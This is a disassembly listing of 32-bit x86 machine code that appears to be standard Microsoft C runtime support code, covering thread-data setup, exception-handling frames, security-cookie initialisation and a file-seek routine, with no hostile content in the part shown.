  402b11:	89 86 fc 01 00 00    	mov    %eax,0x1fc(%esi)
  402b17:	89 7e 70             	mov    %edi,0x70(%esi)
  402b1a:	c6 86 c8 00 00 00 43 	movb   $0x43,0xc8(%esi)
  402b21:	c6 86 4b 01 00 00 43 	movb   $0x43,0x14b(%esi)
  402b28:	c7 46 68 20 d5 40 00 	movl   $0x40d520,0x68(%esi)
  402b2f:	6a 0d                	push   $0xd
  402b31:	e8 20 30 00 00       	call   0x405b56
  402b36:	59                   	pop    %ecx
  402b37:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402b3b:	ff 76 68             	push   0x68(%esi)
  402b3e:	ff 15 b0 a0 40 00    	call   *0x40a0b0
  402b44:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402b4b:	e8 3e 00 00 00       	call   0x402b8e
  402b50:	6a 0c                	push   $0xc
  402b52:	e8 ff 2f 00 00       	call   0x405b56
  402b57:	59                   	pop    %ecx
  402b58:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402b5b:	8b 45 0c             	mov    0xc(%ebp),%eax
  402b5e:	89 46 6c             	mov    %eax,0x6c(%esi)
  402b61:	85 c0                	test   %eax,%eax
  402b63:	75 08                	jne    0x402b6d
  402b65:	a1 28 db 40 00       	mov    0x40db28,%eax
  402b6a:	89 46 6c             	mov    %eax,0x6c(%esi)
  402b6d:	ff 76 6c             	push   0x6c(%esi)
  402b70:	e8 9a 1a 00 00       	call   0x40460f
  402b75:	59                   	pop    %ecx
  402b76:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402b7d:	e8 15 00 00 00       	call   0x402b97
  402b82:	e8 de 03 00 00       	call   0x402f65
  402b87:	c3                   	ret
  402b88:	33 ff                	xor    %edi,%edi
  402b8a:	47                   	inc    %edi
  402b8b:	8b 75 08             	mov    0x8(%ebp),%esi
  402b8e:	6a 0d                	push   $0xd
  402b90:	e8 e7 2e 00 00       	call   0x405a7c
  402b95:	59                   	pop    %ecx
  402b96:	c3                   	ret
  402b97:	6a 0c                	push   $0xc
  402b99:	e8 de 2e 00 00       	call   0x405a7c
  402b9e:	59                   	pop    %ecx
  402b9f:	c3                   	ret
  402ba0:	8b ff                	mov    %edi,%edi
  402ba2:	56                   	push   %esi
  402ba3:	57                   	push   %edi
  402ba4:	ff 15 8c a0 40 00    	call   *0x40a08c
  402baa:	ff 35 90 d2 40 00    	push   0x40d290
  402bb0:	8b f8                	mov    %eax,%edi
  402bb2:	e8 91 fe ff ff       	call   0x402a48
  402bb7:	ff d0                	call   *%eax
  402bb9:	8b f0                	mov    %eax,%esi
  402bbb:	85 f6                	test   %esi,%esi
  402bbd:	75 4e                	jne    0x402c0d
  402bbf:	68 14 02 00 00       	push   $0x214
  402bc4:	6a 01                	push   $0x1
  402bc6:	e8 14 1d 00 00       	call   0x4048df
  402bcb:	8b f0                	mov    %eax,%esi
  402bcd:	59                   	pop    %ecx
  402bce:	59                   	pop    %ecx
  402bcf:	85 f6                	test   %esi,%esi
  402bd1:	74 3a                	je     0x402c0d
  402bd3:	56                   	push   %esi
  402bd4:	ff 35 90 d2 40 00    	push   0x40d290
  402bda:	ff 35 74 e3 40 00    	push   0x40e374
  402be0:	e8 e8 fd ff ff       	call   0x4029cd
  402be5:	59                   	pop    %ecx
  402be6:	ff d0                	call   *%eax
  402be8:	85 c0                	test   %eax,%eax
  402bea:	74 18                	je     0x402c04
  402bec:	6a 00                	push   $0x0
  402bee:	56                   	push   %esi
  402bef:	e8 c5 fe ff ff       	call   0x402ab9
  402bf4:	59                   	pop    %ecx
  402bf5:	59                   	pop    %ecx
  402bf6:	ff 15 48 a0 40 00    	call   *0x40a048
  402bfc:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  402c00:	89 06                	mov    %eax,(%esi)
  402c02:	eb 09                	jmp    0x402c0d
  402c04:	56                   	push   %esi
  402c05:	e8 e1 1b 00 00       	call   0x4047eb
  402c0a:	59                   	pop    %ecx
  402c0b:	33 f6                	xor    %esi,%esi
  402c0d:	57                   	push   %edi
  402c0e:	ff 15 b4 a0 40 00    	call   *0x40a0b4
  402c14:	5f                   	pop    %edi
  402c15:	8b c6                	mov    %esi,%eax
  402c17:	5e                   	pop    %esi
  402c18:	c3                   	ret
  402c19:	8b ff                	mov    %edi,%edi
  402c1b:	56                   	push   %esi
  402c1c:	e8 7f ff ff ff       	call   0x402ba0
  402c21:	8b f0                	mov    %eax,%esi
  402c23:	85 f6                	test   %esi,%esi
  402c25:	75 08                	jne    0x402c2f
  402c27:	6a 10                	push   $0x10
  402c29:	e8 6e ef ff ff       	call   0x401b9c
  402c2e:	59                   	pop    %ecx
  402c2f:	8b c6                	mov    %esi,%eax
  402c31:	5e                   	pop    %esi
  402c32:	c3                   	ret
  402c33:	6a 08                	push   $0x8
  402c35:	68 00 b6 40 00       	push   $0x40b600
  402c3a:	e8 e1 02 00 00       	call   0x402f20
  402c3f:	8b 75 08             	mov    0x8(%ebp),%esi
  402c42:	85 f6                	test   %esi,%esi
  402c44:	0f 84 f8 00 00 00    	je     0x402d42
  402c4a:	8b 46 24             	mov    0x24(%esi),%eax
  402c4d:	85 c0                	test   %eax,%eax
  402c4f:	74 07                	je     0x402c58
  402c51:	50                   	push   %eax
  402c52:	e8 94 1b 00 00       	call   0x4047eb
  402c57:	59                   	pop    %ecx
  402c58:	8b 46 2c             	mov    0x2c(%esi),%eax
  402c5b:	85 c0                	test   %eax,%eax
  402c5d:	74 07                	je     0x402c66
  402c5f:	50                   	push   %eax
  402c60:	e8 86 1b 00 00       	call   0x4047eb
  402c65:	59                   	pop    %ecx
  402c66:	8b 46 34             	mov    0x34(%esi),%eax
  402c69:	85 c0                	test   %eax,%eax
  402c6b:	74 07                	je     0x402c74
  402c6d:	50                   	push   %eax
  402c6e:	e8 78 1b 00 00       	call   0x4047eb
  402c73:	59                   	pop    %ecx
  402c74:	8b 46 3c             	mov    0x3c(%esi),%eax
  402c77:	85 c0                	test   %eax,%eax
  402c79:	74 07                	je     0x402c82
  402c7b:	50                   	push   %eax
  402c7c:	e8 6a 1b 00 00       	call   0x4047eb
  402c81:	59                   	pop    %ecx
  402c82:	8b 46 40             	mov    0x40(%esi),%eax
  402c85:	85 c0                	test   %eax,%eax
  402c87:	74 07                	je     0x402c90
  402c89:	50                   	push   %eax
  402c8a:	e8 5c 1b 00 00       	call   0x4047eb
  402c8f:	59                   	pop    %ecx
  402c90:	8b 46 44             	mov    0x44(%esi),%eax
  402c93:	85 c0                	test   %eax,%eax
  402c95:	74 07                	je     0x402c9e
  402c97:	50                   	push   %eax
  402c98:	e8 4e 1b 00 00       	call   0x4047eb
  402c9d:	59                   	pop    %ecx
  402c9e:	8b 46 48             	mov    0x48(%esi),%eax
  402ca1:	85 c0                	test   %eax,%eax
  402ca3:	74 07                	je     0x402cac
  402ca5:	50                   	push   %eax
  402ca6:	e8 40 1b 00 00       	call   0x4047eb
  402cab:	59                   	pop    %ecx
  402cac:	8b 46 5c             	mov    0x5c(%esi),%eax
  402caf:	3d f8 a7 40 00       	cmp    $0x40a7f8,%eax
  402cb4:	74 07                	je     0x402cbd
  402cb6:	50                   	push   %eax
  402cb7:	e8 2f 1b 00 00       	call   0x4047eb
  402cbc:	59                   	pop    %ecx
  402cbd:	6a 0d                	push   $0xd
  402cbf:	e8 92 2e 00 00       	call   0x405b56
  402cc4:	59                   	pop    %ecx
  402cc5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402cc9:	8b 7e 68             	mov    0x68(%esi),%edi
  402ccc:	85 ff                	test   %edi,%edi
  402cce:	74 1a                	je     0x402cea
  402cd0:	57                   	push   %edi
  402cd1:	ff 15 b8 a0 40 00    	call   *0x40a0b8
  402cd7:	85 c0                	test   %eax,%eax
  402cd9:	75 0f                	jne    0x402cea
  402cdb:	81 ff 20 d5 40 00    	cmp    $0x40d520,%edi
  402ce1:	74 07                	je     0x402cea
  402ce3:	57                   	push   %edi
  402ce4:	e8 02 1b 00 00       	call   0x4047eb
  402ce9:	59                   	pop    %ecx
  402cea:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402cf1:	e8 57 00 00 00       	call   0x402d4d
  402cf6:	6a 0c                	push   $0xc
  402cf8:	e8 59 2e 00 00       	call   0x405b56
  402cfd:	59                   	pop    %ecx
  402cfe:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402d05:	8b 7e 6c             	mov    0x6c(%esi),%edi
  402d08:	85 ff                	test   %edi,%edi
  402d0a:	74 23                	je     0x402d2f
  402d0c:	57                   	push   %edi
  402d0d:	e8 8c 19 00 00       	call   0x40469e
  402d12:	59                   	pop    %ecx
  402d13:	3b 3d 28 db 40 00    	cmp    0x40db28,%edi
  402d19:	74 14                	je     0x402d2f
  402d1b:	81 ff 50 da 40 00    	cmp    $0x40da50,%edi
  402d21:	74 0c                	je     0x402d2f
  402d23:	83 3f 00             	cmpl   $0x0,(%edi)
  402d26:	75 07                	jne    0x402d2f
  402d28:	57                   	push   %edi
  402d29:	e8 98 17 00 00       	call   0x4044c6
  402d2e:	59                   	pop    %ecx
  402d2f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402d36:	e8 1e 00 00 00       	call   0x402d59
  402d3b:	56                   	push   %esi
  402d3c:	e8 aa 1a 00 00       	call   0x4047eb
  402d41:	59                   	pop    %ecx
  402d42:	e8 1e 02 00 00       	call   0x402f65
  402d47:	c2 04 00             	ret    $0x4
  402d4a:	8b 75 08             	mov    0x8(%ebp),%esi
  402d4d:	6a 0d                	push   $0xd
  402d4f:	e8 28 2d 00 00       	call   0x405a7c
  402d54:	59                   	pop    %ecx
  402d55:	c3                   	ret
  402d56:	8b 75 08             	mov    0x8(%ebp),%esi
  402d59:	6a 0c                	push   $0xc
  402d5b:	e8 1c 2d 00 00       	call   0x405a7c
  402d60:	59                   	pop    %ecx
  402d61:	c3                   	ret
  402d62:	8b ff                	mov    %edi,%edi
  402d64:	56                   	push   %esi
  402d65:	57                   	push   %edi
  402d66:	be 84 a8 40 00       	mov    $0x40a884,%esi
  402d6b:	56                   	push   %esi
  402d6c:	ff 15 68 a0 40 00    	call   *0x40a068
  402d72:	85 c0                	test   %eax,%eax
  402d74:	75 07                	jne    0x402d7d
  402d76:	56                   	push   %esi
  402d77:	e8 f0 ed ff ff       	call   0x401b6c
  402d7c:	59                   	pop    %ecx
  402d7d:	8b f8                	mov    %eax,%edi
  402d7f:	85 ff                	test   %edi,%edi
  402d81:	0f 84 5e 01 00 00    	je     0x402ee5
  402d87:	8b 35 70 a0 40 00    	mov    0x40a070,%esi
  402d8d:	68 d0 a8 40 00       	push   $0x40a8d0
  402d92:	57                   	push   %edi
  402d93:	ff d6                	call   *%esi
  402d95:	68 c4 a8 40 00       	push   $0x40a8c4
  402d9a:	57                   	push   %edi
  402d9b:	a3 6c e3 40 00       	mov    %eax,0x40e36c
  402da0:	ff d6                	call   *%esi
  402da2:	68 b8 a8 40 00       	push   $0x40a8b8
  402da7:	57                   	push   %edi
  402da8:	a3 70 e3 40 00       	mov    %eax,0x40e370
  402dad:	ff d6                	call   *%esi
  402daf:	68 b0 a8 40 00       	push   $0x40a8b0
  402db4:	57                   	push   %edi
  402db5:	a3 74 e3 40 00       	mov    %eax,0x40e374
  402dba:	ff d6                	call   *%esi
  402dbc:	83 3d 6c e3 40 00 00 	cmpl   $0x0,0x40e36c
  402dc3:	8b 35 a8 a0 40 00    	mov    0x40a0a8,%esi
  402dc9:	a3 78 e3 40 00       	mov    %eax,0x40e378
  402dce:	74 16                	je     0x402de6
  402dd0:	83 3d 70 e3 40 00 00 	cmpl   $0x0,0x40e370
  402dd7:	74 0d                	je     0x402de6
  402dd9:	83 3d 74 e3 40 00 00 	cmpl   $0x0,0x40e374
  402de0:	74 04                	je     0x402de6
  402de2:	85 c0                	test   %eax,%eax
  402de4:	75 24                	jne    0x402e0a
  402de6:	a1 a0 a0 40 00       	mov    0x40a0a0,%eax
  402deb:	a3 70 e3 40 00       	mov    %eax,0x40e370
  402df0:	a1 ac a0 40 00       	mov    0x40a0ac,%eax
  402df5:	c7 05 6c e3 40 00 3f 	movl   $0x402a3f,0x40e36c
  402dfc:	2a 40 00 
  402dff:	89 35 74 e3 40 00    	mov    %esi,0x40e374
  402e05:	a3 78 e3 40 00       	mov    %eax,0x40e378
  402e0a:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  402e10:	a3 94 d2 40 00       	mov    %eax,0x40d294
  402e15:	83 f8 ff             	cmp    $0xffffffff,%eax
  402e18:	0f 84 cc 00 00 00    	je     0x402eea
  402e1e:	ff 35 70 e3 40 00    	push   0x40e370
  402e24:	50                   	push   %eax
  402e25:	ff d6                	call   *%esi
  402e27:	85 c0                	test   %eax,%eax
  402e29:	0f 84 bb 00 00 00    	je     0x402eea
  402e2f:	e8 22 f0 ff ff       	call   0x401e56
  402e34:	ff 35 6c e3 40 00    	push   0x40e36c
  402e3a:	e8 13 fb ff ff       	call   0x402952
  402e3f:	ff 35 70 e3 40 00    	push   0x40e370
  402e45:	a3 6c e3 40 00       	mov    %eax,0x40e36c
  402e4a:	e8 03 fb ff ff       	call   0x402952
  402e4f:	ff 35 74 e3 40 00    	push   0x40e374
  402e55:	a3 70 e3 40 00       	mov    %eax,0x40e370
  402e5a:	e8 f3 fa ff ff       	call   0x402952
  402e5f:	ff 35 78 e3 40 00    	push   0x40e378
  402e65:	a3 74 e3 40 00       	mov    %eax,0x40e374
  402e6a:	e8 e3 fa ff ff       	call   0x402952
  402e6f:	83 c4 10             	add    $0x10,%esp
  402e72:	a3 78 e3 40 00       	mov    %eax,0x40e378
  402e77:	e8 5e 2b 00 00       	call   0x4059da
  402e7c:	85 c0                	test   %eax,%eax
  402e7e:	74 65                	je     0x402ee5
  402e80:	68 33 2c 40 00       	push   $0x402c33
  402e85:	ff 35 6c e3 40 00    	push   0x40e36c
  402e8b:	e8 3d fb ff ff       	call   0x4029cd
  402e90:	59                   	pop    %ecx
  402e91:	ff d0                	call   *%eax
  402e93:	a3 90 d2 40 00       	mov    %eax,0x40d290
  402e98:	83 f8 ff             	cmp    $0xffffffff,%eax
  402e9b:	74 48                	je     0x402ee5
  402e9d:	68 14 02 00 00       	push   $0x214
  402ea2:	6a 01                	push   $0x1
  402ea4:	e8 36 1a 00 00       	call   0x4048df
  402ea9:	8b f0                	mov    %eax,%esi
  402eab:	59                   	pop    %ecx
  402eac:	59                   	pop    %ecx
  402ead:	85 f6                	test   %esi,%esi
  402eaf:	74 34                	je     0x402ee5
  402eb1:	56                   	push   %esi
  402eb2:	ff 35 90 d2 40 00    	push   0x40d290
  402eb8:	ff 35 74 e3 40 00    	push   0x40e374
  402ebe:	e8 0a fb ff ff       	call   0x4029cd
  402ec3:	59                   	pop    %ecx
  402ec4:	ff d0                	call   *%eax
  402ec6:	85 c0                	test   %eax,%eax
  402ec8:	74 1b                	je     0x402ee5
  402eca:	6a 00                	push   $0x0
  402ecc:	56                   	push   %esi
  402ecd:	e8 e7 fb ff ff       	call   0x402ab9
  402ed2:	59                   	pop    %ecx
  402ed3:	59                   	pop    %ecx
  402ed4:	ff 15 48 a0 40 00    	call   *0x40a048
  402eda:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  402ede:	89 06                	mov    %eax,(%esi)
  402ee0:	33 c0                	xor    %eax,%eax
  402ee2:	40                   	inc    %eax
  402ee3:	eb 07                	jmp    0x402eec
  402ee5:	e8 92 fb ff ff       	call   0x402a7c
  402eea:	33 c0                	xor    %eax,%eax
  402eec:	5f                   	pop    %edi
  402eed:	5e                   	pop    %esi
  402eee:	c3                   	ret
  402eef:	8b ff                	mov    %edi,%edi
  402ef1:	55                   	push   %ebp
  402ef2:	8b ec                	mov    %esp,%ebp
  402ef4:	33 c0                	xor    %eax,%eax
  402ef6:	39 45 08             	cmp    %eax,0x8(%ebp)
  402ef9:	6a 00                	push   $0x0
  402efb:	0f 94 c0             	sete   %al
  402efe:	68 00 10 00 00       	push   $0x1000
  402f03:	50                   	push   %eax
  402f04:	ff 15 bc a0 40 00    	call   *0x40a0bc
  402f0a:	a3 7c e3 40 00       	mov    %eax,0x40e37c
  402f0f:	85 c0                	test   %eax,%eax
  402f11:	75 02                	jne    0x402f15
  402f13:	5d                   	pop    %ebp
  402f14:	c3                   	ret
  402f15:	33 c0                	xor    %eax,%eax
  402f17:	40                   	inc    %eax
  402f18:	a3 a8 f9 40 00       	mov    %eax,0x40f9a8
  402f1d:	5d                   	pop    %ebp
  402f1e:	c3                   	ret
  402f1f:	cc                   	int3
  402f20:	68 80 2f 40 00       	push   $0x402f80
  402f25:	64 ff 35 00 00 00 00 	push   %fs:0x0
  402f2c:	8b 44 24 10          	mov    0x10(%esp),%eax
  402f30:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  402f34:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  402f38:	2b e0                	sub    %eax,%esp
  402f3a:	53                   	push   %ebx
  402f3b:	56                   	push   %esi
  402f3c:	57                   	push   %edi
  402f3d:	a1 60 db 40 00       	mov    0x40db60,%eax
  402f42:	31 45 fc             	xor    %eax,-0x4(%ebp)
  402f45:	33 c5                	xor    %ebp,%eax
  402f47:	50                   	push   %eax
  402f48:	89 65 e8             	mov    %esp,-0x18(%ebp)
  402f4b:	ff 75 f8             	push   -0x8(%ebp)
  402f4e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402f51:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  402f58:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402f5b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402f5e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402f64:	c3                   	ret
  402f65:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402f68:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402f6f:	59                   	pop    %ecx
  402f70:	5f                   	pop    %edi
  402f71:	5f                   	pop    %edi
  402f72:	5e                   	pop    %esi
  402f73:	5b                   	pop    %ebx
  402f74:	8b e5                	mov    %ebp,%esp
  402f76:	5d                   	pop    %ebp
  402f77:	51                   	push   %ecx
  402f78:	c3                   	ret
  402f79:	cc                   	int3
  402f7a:	cc                   	int3
  402f7b:	cc                   	int3
  402f7c:	cc                   	int3
  402f7d:	cc                   	int3
  402f7e:	cc                   	int3
  402f7f:	cc                   	int3
  402f80:	8b ff                	mov    %edi,%edi
  402f82:	55                   	push   %ebp
  402f83:	8b ec                	mov    %esp,%ebp
  402f85:	83 ec 18             	sub    $0x18,%esp
  402f88:	53                   	push   %ebx
  402f89:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402f8c:	56                   	push   %esi
  402f8d:	8b 73 08             	mov    0x8(%ebx),%esi
  402f90:	33 35 60 db 40 00    	xor    0x40db60,%esi
  402f96:	57                   	push   %edi
  402f97:	8b 06                	mov    (%esi),%eax
  402f99:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  402f9d:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  402fa4:	8d 7b 10             	lea    0x10(%ebx),%edi
  402fa7:	83 f8 fe             	cmp    $0xfffffffe,%eax
  402faa:	74 0d                	je     0x402fb9
  402fac:	8b 4e 04             	mov    0x4(%esi),%ecx
  402faf:	03 cf                	add    %edi,%ecx
  402fb1:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  402fb4:	e8 36 1c 00 00       	call   0x404bef
  402fb9:	8b 4e 0c             	mov    0xc(%esi),%ecx
  402fbc:	8b 46 08             	mov    0x8(%esi),%eax
  402fbf:	03 cf                	add    %edi,%ecx
  402fc1:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  402fc4:	e8 26 1c 00 00       	call   0x404bef
  402fc9:	8b 45 08             	mov    0x8(%ebp),%eax
  402fcc:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  402fd0:	0f 85 16 01 00 00    	jne    0x4030ec
  402fd6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402fd9:	8d 55 e8             	lea    -0x18(%ebp),%edx
  402fdc:	89 53 fc             	mov    %edx,-0x4(%ebx)
  402fdf:	8b 5b 0c             	mov    0xc(%ebx),%ebx
  402fe2:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402fe5:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  402fe8:	83 fb fe             	cmp    $0xfffffffe,%ebx
  402feb:	74 5f                	je     0x40304c
  402fed:	8d 49 00             	lea    0x0(%ecx),%ecx
  402ff0:	8d 04 5b             	lea    (%ebx,%ebx,2),%eax
  402ff3:	8b 4c 86 14          	mov    0x14(%esi,%eax,4),%ecx
  402ff7:	8d 44 86 10          	lea    0x10(%esi,%eax,4),%eax
  402ffb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402ffe:	8b 00                	mov    (%eax),%eax
  403000:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403003:	85 c9                	test   %ecx,%ecx
  403005:	74 14                	je     0x40301b
  403007:	8b d7                	mov    %edi,%edx
  403009:	e8 c0 43 00 00       	call   0x4073ce
  40300e:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  403012:	85 c0                	test   %eax,%eax
  403014:	7c 40                	jl     0x403056
  403016:	7f 47                	jg     0x40305f
  403018:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40301b:	8b d8                	mov    %eax,%ebx
  40301d:	83 f8 fe             	cmp    $0xfffffffe,%eax
  403020:	75 ce                	jne    0x402ff0
  403022:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  403026:	74 24                	je     0x40304c
  403028:	8b 06                	mov    (%esi),%eax
  40302a:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40302d:	74 0d                	je     0x40303c
  40302f:	8b 4e 04             	mov    0x4(%esi),%ecx
  403032:	03 cf                	add    %edi,%ecx
  403034:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  403037:	e8 b3 1b 00 00       	call   0x404bef
  40303c:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40303f:	8b 56 08             	mov    0x8(%esi),%edx
  403042:	03 cf                	add    %edi,%ecx
  403044:	33 0c 3a             	xor    (%edx,%edi,1),%ecx
  403047:	e8 a3 1b 00 00       	call   0x404bef
  40304c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40304f:	5f                   	pop    %edi
  403050:	5e                   	pop    %esi
  403051:	5b                   	pop    %ebx
  403052:	8b e5                	mov    %ebp,%esp
  403054:	5d                   	pop    %ebp
  403055:	c3                   	ret
  403056:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40305d:	eb c9                	jmp    0x403028
  40305f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403062:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%ecx)
  403068:	75 29                	jne    0x403093
  40306a:	83 3d a4 f9 40 00 00 	cmpl   $0x0,0x40f9a4
  403071:	74 20                	je     0x403093
  403073:	68 a4 f9 40 00       	push   $0x40f9a4
  403078:	e8 e3 2c 00 00       	call   0x405d60
  40307d:	83 c4 04             	add    $0x4,%esp
  403080:	85 c0                	test   %eax,%eax
  403082:	74 0f                	je     0x403093
  403084:	8b 55 08             	mov    0x8(%ebp),%edx
  403087:	6a 01                	push   $0x1
  403089:	52                   	push   %edx
  40308a:	ff 15 a4 f9 40 00    	call   *0x40f9a4
  403090:	83 c4 08             	add    $0x8,%esp
  403093:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403096:	e8 63 43 00 00       	call   0x4073fe
  40309b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40309e:	39 58 0c             	cmp    %ebx,0xc(%eax)
  4030a1:	74 12                	je     0x4030b5
  4030a3:	68 60 db 40 00       	push   $0x40db60
  4030a8:	57                   	push   %edi
  4030a9:	8b d3                	mov    %ebx,%edx
  4030ab:	8b c8                	mov    %eax,%ecx
  4030ad:	e8 66 43 00 00       	call   0x407418
  4030b2:	8b 45 0c             	mov    0xc(%ebp),%eax
  4030b5:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4030b8:	89 48 0c             	mov    %ecx,0xc(%eax)
  4030bb:	8b 06                	mov    (%esi),%eax
  4030bd:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4030c0:	74 0d                	je     0x4030cf
  4030c2:	8b 4e 04             	mov    0x4(%esi),%ecx
  4030c5:	03 cf                	add    %edi,%ecx
  4030c7:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  4030ca:	e8 20 1b 00 00       	call   0x404bef
  4030cf:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4030d2:	8b 56 08             	mov    0x8(%esi),%edx
  4030d5:	03 cf                	add    %edi,%ecx
  4030d7:	33 0c 3a             	xor    (%edx,%edi,1),%ecx
  4030da:	e8 10 1b 00 00       	call   0x404bef
  4030df:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4030e2:	8b 48 08             	mov    0x8(%eax),%ecx
  4030e5:	8b d7                	mov    %edi,%edx
  4030e7:	e8 f9 42 00 00       	call   0x4073e5
  4030ec:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
  4030f1:	39 53 0c             	cmp    %edx,0xc(%ebx)
  4030f4:	0f 84 52 ff ff ff    	je     0x40304c
  4030fa:	68 60 db 40 00       	push   $0x40db60
  4030ff:	57                   	push   %edi
  403100:	8b cb                	mov    %ebx,%ecx
  403102:	e8 11 43 00 00       	call   0x407418
  403107:	e9 1c ff ff ff       	jmp    0x403028
  40310c:	8b ff                	mov    %edi,%edi
  40310e:	55                   	push   %ebp
  40310f:	8b ec                	mov    %esp,%ebp
  403111:	83 ec 10             	sub    $0x10,%esp
  403114:	a1 60 db 40 00       	mov    0x40db60,%eax
  403119:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40311d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403121:	53                   	push   %ebx
  403122:	57                   	push   %edi
  403123:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  403128:	bb 00 00 ff ff       	mov    $0xffff0000,%ebx
  40312d:	3b c7                	cmp    %edi,%eax
  40312f:	74 0d                	je     0x40313e
  403131:	85 c3                	test   %eax,%ebx
  403133:	74 09                	je     0x40313e
  403135:	f7 d0                	not    %eax
  403137:	a3 64 db 40 00       	mov    %eax,0x40db64
  40313c:	eb 60                	jmp    0x40319e
  40313e:	56                   	push   %esi
  40313f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403142:	50                   	push   %eax
  403143:	ff 15 d4 a0 40 00    	call   *0x40a0d4
  403149:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40314c:	33 75 f8             	xor    -0x8(%ebp),%esi
  40314f:	ff 15 d0 a0 40 00    	call   *0x40a0d0
  403155:	33 f0                	xor    %eax,%esi
  403157:	ff 15 48 a0 40 00    	call   *0x40a048
  40315d:	33 f0                	xor    %eax,%esi
  40315f:	ff 15 cc a0 40 00    	call   *0x40a0cc
  403165:	33 f0                	xor    %eax,%esi
  403167:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40316a:	50                   	push   %eax
  40316b:	ff 15 c8 a0 40 00    	call   *0x40a0c8
  403171:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403174:	33 45 f0             	xor    -0x10(%ebp),%eax
  403177:	33 f0                	xor    %eax,%esi
  403179:	3b f7                	cmp    %edi,%esi
  40317b:	75 07                	jne    0x403184
  40317d:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  403182:	eb 0b                	jmp    0x40318f
  403184:	85 f3                	test   %esi,%ebx
  403186:	75 07                	jne    0x40318f
  403188:	8b c6                	mov    %esi,%eax
  40318a:	c1 e0 10             	shl    $0x10,%eax
  40318d:	0b f0                	or     %eax,%esi
  40318f:	89 35 60 db 40 00    	mov    %esi,0x40db60
  403195:	f7 d6                	not    %esi
  403197:	89 35 64 db 40 00    	mov    %esi,0x40db64
  40319d:	5e                   	pop    %esi
  40319e:	5f                   	pop    %edi
  40319f:	5b                   	pop    %ebx
  4031a0:	c9                   	leave
  4031a1:	c3                   	ret
  4031a2:	8b ff                	mov    %edi,%edi
  4031a4:	55                   	push   %ebp
  4031a5:	8b ec                	mov    %esp,%ebp
  4031a7:	51                   	push   %ecx
  4031a8:	51                   	push   %ecx
  4031a9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4031ac:	56                   	push   %esi
  4031ad:	8b 75 08             	mov    0x8(%ebp),%esi
  4031b0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4031b3:	8b 45 10             	mov    0x10(%ebp),%eax
  4031b6:	57                   	push   %edi
  4031b7:	56                   	push   %esi
  4031b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4031bb:	e8 f5 42 00 00       	call   0x4074b5
  4031c0:	83 cf ff             	or     $0xffffffff,%edi
  4031c3:	59                   	pop    %ecx
  4031c4:	3b c7                	cmp    %edi,%eax
  4031c6:	75 11                	jne    0x4031d9
  4031c8:	e8 b2 e7 ff ff       	call   0x40197f
  4031cd:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4031d3:	8b c7                	mov    %edi,%eax
  4031d5:	8b d7                	mov    %edi,%edx
  4031d7:	eb 4a                	jmp    0x403223
  4031d9:	ff 75 14             	push   0x14(%ebp)
  4031dc:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4031df:	51                   	push   %ecx
  4031e0:	ff 75 f8             	push   -0x8(%ebp)
  4031e3:	50                   	push   %eax
  4031e4:	ff 15 d8 a0 40 00    	call   *0x40a0d8
  4031ea:	89 45 f8             	mov    %eax,-0x8(%ebp)
